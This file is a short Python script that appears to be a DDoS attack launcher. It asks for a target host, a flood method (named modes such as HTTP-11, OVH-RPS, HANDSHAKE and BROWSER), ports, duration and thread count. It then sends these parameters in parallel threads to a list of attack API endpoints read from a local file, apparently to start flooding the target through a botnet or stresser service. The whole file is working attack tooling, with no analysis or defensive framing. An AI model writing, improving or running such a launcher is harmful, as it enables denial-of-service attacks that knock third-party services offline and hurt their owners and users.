import requests,threading
from urllib.parse import urlparse

def reads_api():
    with open('API.txt','r') as f:return f.read().split('\n')

def api_sender(links,opt):
 try:
    r = requests.get(links,headers=opt)
 except Exception as e:print(e)

headers = {}
methods = input("Methods HTTP-11 HTTP-19 .. etc ?")
hostname = input("Target ?")
scheme = ''
ports = 80
proxy = ''
links = ''
if methods.upper() in ['BROWSER','HANDSHAKE','AMP','MURD-OPT','MURD-OPT2']:
   parsed_url = urlparse(hostname)
   hostname = parsed_url.hostname
   scheme = parsed_url.scheme
   links = parsed_url.path or '/'
if methods.upper() == 'BROWSER':
   proxy = input("Type None SOCKS5 SOCKS4 HTTP HTTPS ?")
if methods.upper() in ['HTTP-11','HTTP-19','OVH-RPS','OVH-CONNECT','HTTP-QUERY']:
   ports = int(input("Ports ?"))
meth_http = input("HTTP-METHODS GET, POST and etc ?")
times = int(input("TIMES ?"))
th = int(input("THREAD ?"))
a = f'target={hostname}&time={times}&threads={th}&methods={methods}'
opt = {'X-Port':str(ports),'X-Methods':meth_http,'X-Protocols':scheme,'X-Links':links,'X-Browser':proxy}
for a2 in reads_api():
   threading.Thread(target=api_sender,args=(a2+a,opt)).start()